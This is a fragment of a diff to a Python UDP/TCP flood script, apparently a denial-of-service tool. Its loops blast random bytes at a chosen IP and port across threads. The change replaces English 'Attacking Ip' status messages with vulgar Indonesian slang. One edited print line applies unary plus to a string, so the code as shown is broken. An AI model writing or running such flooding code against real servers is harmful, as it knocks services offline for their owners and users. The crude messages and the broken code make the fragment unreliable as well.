@@ -28,9 +28,9 @@ def udp():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(+"\033[91m  Attacking Ip %s \\033[91m And Port %s"%(ip,port))
+			print(+"\033[91m  Mengentod %s \\033[91m Dan memberi peju %s"%(ip,port))
 		except:
-			print("\033[91m Servers %s Has Down %s"%(ip,port))
+			print("\033[91m Server %s MT %s"%(ip,port))
 def tcp():
 	data = random._urandom(3016)
 	while True:
@@ -42,7 +42,7 @@ def tcp():
 				s.send(data)
 		except:
 			s.close()
-			print("\033[91m Attacking Ip %s And Port %s"%(ip,port))
+			print("\033[91m Mengentod %s Dan memberi udud %s"%(ip,port))
 
 for y in range(threads):
     if choice == 'UDP':
